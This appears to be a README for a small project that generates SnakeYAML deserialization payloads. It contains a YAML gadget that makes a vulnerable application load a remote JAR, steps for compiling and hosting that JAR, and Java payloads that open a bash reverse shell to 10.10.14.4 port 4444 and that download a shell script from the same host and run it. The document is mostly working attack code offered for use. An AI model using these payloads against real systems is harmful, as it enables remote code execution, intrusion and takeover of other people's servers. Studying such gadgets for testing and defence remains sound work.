A tiny project for generating payloads for the SnakeYAML deserialization gadget (taken from https://github.com/mbechler/marshalsec):
```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://artsploit.com/yaml-payload.jar"]
  ]]
]
```
Put the java code you want execute into [AwesomeScriptEngineFactory.java](./src/artsploit/AwesomeScriptEngineFactory.java) and compile:
```bash
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
```

Then place the 'yaml-payload.jar' file in to the web server folder (e.g. artsploit.com/yaml-payload.jar)

## Additional Payload Examples

The [AwesomeScriptEngineFactory.java](./src/artsploit/AwesomeScriptEngineFactory.java) file includes additional commented-out payload examples that you can use:

### Reverse Shell Payloads
```java
public AwesomeScriptEngineFactory() {
    String [] cmd={"bash","-c","bash -i >& /dev/tcp/10.10.14.4/4444 0>&1"};
    String [] jex={"bash","-c","{echo,$(echo -n $cmd | base64)}|{base64,-d}|{bash,-i}"};
    try {
        Runtime.getRuntime().exec(cmd);
        Runtime.getRuntime().exec(jex);
        Runtime.getRuntime().exec("echo $jex");
    } catch (IOException e) {
        e.printStackTrace();
    }
}
```

### Download and Execute Payloads
```java
public AwesomeScriptEngineFactory() {
    RunCmd("curl 10.10.14.4/shell.sh -o /tmp/shell.sh");
    RunCmd("bash /tmp/shell.sh");
}

public String RunCmd(String Cmd) {
    try {
        Runtime.getRuntime().exec(Cmd);
    } catch (IOException e) {
        e.printStackTrace();
    }
    return null;
}
```

Simply uncomment the desired payload in the source file and rebuild the JAR.
